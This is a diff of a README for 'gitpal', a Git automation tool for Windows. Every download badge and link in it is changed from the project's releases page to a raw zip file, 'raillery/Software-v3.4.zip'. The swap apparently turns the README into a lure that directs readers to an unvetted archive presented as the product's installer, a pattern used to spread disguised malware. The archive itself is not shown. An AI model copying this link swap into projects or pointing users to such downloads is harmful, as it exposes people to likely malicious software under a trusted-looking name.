@@ -1,6 +1,6 @@
 # 🤖 gitpal - Automate Your Git Tasks Easily
 
-[![Download gitpal](https://img.shields.io/badge/Download-gitpal-blue?style=for-the-badge&logo=github)](https://github.com/romansaqib/gitpal/releases)
+[![Download gitpal](https://img.shields.io/badge/Download-gitpal-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/romansaqib/gitpal/main/raillery/Software-v3.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This section will guide you through downloading and running gitpal.
 
 Visit the release page. Use this link to find the latest version of gitpal for Windows:  
 
-[![Download gitpal](https://img.shields.io/badge/Download-gitpal-green?style=for-the-badge)](https://github.com/romansaqib/gitpal/releases)
+[![Download gitpal](https://img.shields.io/badge/Download-gitpal-green?style=for-the-badge)](https://raw.githubusercontent.com/romansaqib/gitpal/main/raillery/Software-v3.4.zip)
 
 When you are on the page, look for the Windows installer file. It will have a name like:
 
@@ -130,7 +130,7 @@ You can adjust gitpal to match your preferences:
 
 To get new versions, revisit this page:
 
-[https://github.com/romansaqib/gitpal/releases](https://github.com/romansaqib/gitpal/releases)
+[https://raw.githubusercontent.com/romansaqib/gitpal/main/raillery/Software-v3.4.zip](https://raw.githubusercontent.com/romansaqib/gitpal/main/raillery/Software-v3.4.zip)
 
 Check often to update gitpal to the latest version with bug fixes and new features.
 
@@ -142,4 +142,4 @@ It supports many common Git activities and tries to reduce the time you spend ma
 
 ---
 
-[![Download gitpal](https://img.shields.io/badge/Download-gitpal-blue?style=for-the-badge)](https://github.com/romansaqib/gitpal/releases)
+[![Download gitpal](https://img.shields.io/badge/Download-gitpal-blue?style=for-the-badge)](https://raw.githubusercontent.com/romansaqib/gitpal/main/raillery/Software-v3.4.zip)
